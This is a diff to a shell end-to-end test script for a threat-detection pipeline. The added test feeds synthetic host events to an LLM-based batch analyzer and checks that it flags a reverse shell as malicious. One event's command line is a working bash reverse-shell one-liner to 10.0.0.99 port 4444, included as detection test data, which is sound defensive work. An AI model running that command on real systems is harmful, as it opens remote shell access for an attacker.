@@ -228,6 +228,73 @@ else
 fi
 
 echo ""
+echo "--- Test 11: Batch LLM analysis ---"
+if [ "$CI" = "true" ]; then
+  warn "Skipping in CI (Elasticsearch and Ollama unavailable)"
+else
+  RUN_ID=$(date +%s)
+  BATCH_HOST="e2e-batch-$RUN_ID"
+  OPEN_ID="e2e-open-$RUN_ID"
+  EXEC_ID="e2e-exec-$RUN_ID"
+  BATCH_WAIT="${BATCH_WAIT:-240}"
+
+  curl -s -X POST "$ANALYSIS_URL/ingest" \
+    -H "Content-Type: application/json" \
+    -d '[
+          {
+              "@timestamp": "2026-03-29T12:00:00Z",
+              "host.name": "'"$BATCH_HOST"'",
+              "event.type": "openat",
+              "event.id": "'"$OPEN_ID"'",
+              "process.pid": 22222,
+              "image.path": "/usr/bin/bash",
+              "file.path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+              "user.name": "testuser"
+          },
+          {
+              "@timestamp": "2026-03-29T12:00:01Z",
+              "host.name": "'"$BATCH_HOST"'",
+              "event.type": "execve",
+              "event.id": "'"$EXEC_ID"'",
+              "process.pid": 22223,
+              "image.path": "/usr/bin/bash",
+              "command.line": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1",
+              "user.name": "testuser"
+          }
+      ]' >/dev/null
+
+  info "Waiting up to ${BATCH_WAIT}s for batch verdict (batch timeout + LLM)..."
+  RESULT=""
+  waited=0
+  while [ $waited -lt "$BATCH_WAIT" ]; do
+    RESULT=$(curl -s "$ES_URL/kb-analysis/_search?q=host.name:%22$BATCH_HOST%22")
+    if echo "$RESULT" | grep -q '"verdict"'; then
+      break
+    fi
+    sleep 5
+    waited=$((waited + 5))
+  done
+
+  if ! echo "$RESULT" | grep -q '"verdict"'; then
+    fail "No batch analysis result for $BATCH_HOST after ${BATCH_WAIT}s"
+  fi
+  if echo "$RESULT" | grep -q "batch-$OPEN_ID"; then
+    fail "Routine libc open was sent for LLM review"
+  fi
+  if ! echo "$RESULT" | grep -q "batch-$EXEC_ID"; then
+    fail "Batch result does not start with the reverse shell event"
+  fi
+  pass "Routine open filtered out of LLM batch"
+
+  VERDICT=$(echo "$RESULT" | grep -o '"verdict"[[:space:]]*:[[:space:]]*"[a-z]*"' | head -1 | grep -o '"[a-z]*"$' | tr -d '"')
+  case "$VERDICT" in
+    malicious) pass "Batch verdict: malicious" ;;
+    benign|suspicious) warn "Batch verdict: $VERDICT (expected malicious for a reverse shell)" ;;
+    *) fail "Batch verdict unparsable: '$VERDICT' (LLM did not follow the output format)" ;;
+  esac
+fi
+
+echo ""
 echo "=========================================="
 pass "All tests passed!"
 echo "=========================================="
@@ -240,5 +307,6 @@ if [ "$CI" = "true" ]; then
   echo "  - Event ingestion: skipped (ES unavailable in CI)"
 else
   echo "  - Event ingestion: working"
+  echo "  - Batch LLM analysis: open filter and verdict format"
 fi
 echo ""
